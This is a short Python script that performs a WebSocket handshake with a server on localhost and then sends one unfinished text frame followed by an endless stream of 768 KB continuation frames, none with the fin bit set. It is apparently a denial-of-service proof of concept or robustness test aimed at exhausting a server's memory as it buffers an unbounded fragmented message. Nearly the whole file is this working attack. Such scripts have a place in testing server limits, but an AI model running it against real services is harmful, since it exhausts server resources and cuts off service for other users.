import os
import socket
import struct
import sys
import time

def handshake(sock, host, port, path):
    headers = "\r\n".join((f"GET {path} HTTP/1.1", 
                           f"Host: {host}:{port}" if port != 80 else f"Host: {host}", 
                           "Upgrade: websocket", 
                           "Connection: Upgrade", 
                           "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==", 
                           "Sec-WebSocket-Version: 13", 
                           "\r\n"))

    sock.send(bytes(headers, "utf-8"))

    resp = sock.recv(4096)
    print("Handshake complete")

def build_header(opcode, payload):
    header = bytearray()
    header.append(opcode)

    payload_len = len(payload)

    if payload_len < 0x7e:
        header.append(0x80 | payload_len)
    elif payload_len < 0xffff:
        header.append(0x80 | 0x7e)
        header.extend(struct.pack("!H", payload_len))
    elif payload_len < 0xffffffffffffffff:
        header.append(0x80 | 0x7f)
        header.extend(struct.pack("!Q", payload_len))
    else:
        sys.exit("Payload is too large")

    mask = os.urandom(4)
    header.extend(mask)

    return (header, mask)

def send_frame(sock, opcode, payload):
    payload = bytearray(payload, "utf-8")
    payload_len = len(payload)
    header, mask = build_header(opcode, payload)

    for i in range(payload_len):
        payload[i] ^= mask[i % 4]

    sock.send(header + payload)

def send_text_frame(sock):
    payload = "to be continued..."
    send_frame(sock, 0x1, payload)

def send_continuation_frame(sock):
    payload = "!" * 1024 * 768
    send_frame(sock, 0x0, payload)

if __name__ == "__main__":
    host = "localhost"
    port = 8000
    path = "/"

    sock = socket.socket()
    sock.connect((host, port))

    handshake(sock, host, port, path)
    send_text_frame(sock)

    print("Text frame sent without fin bit")

    try:
        print("Sending continuation frames without fin bit")
        frames = 0

        while True:
            send_continuation_frame(sock)
            frames += 1
            
            if frames % 100 == 0:
                print(f"Sent {frames} continuation frames")

            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    print("Stopped sending frames")

    sock.close()
    
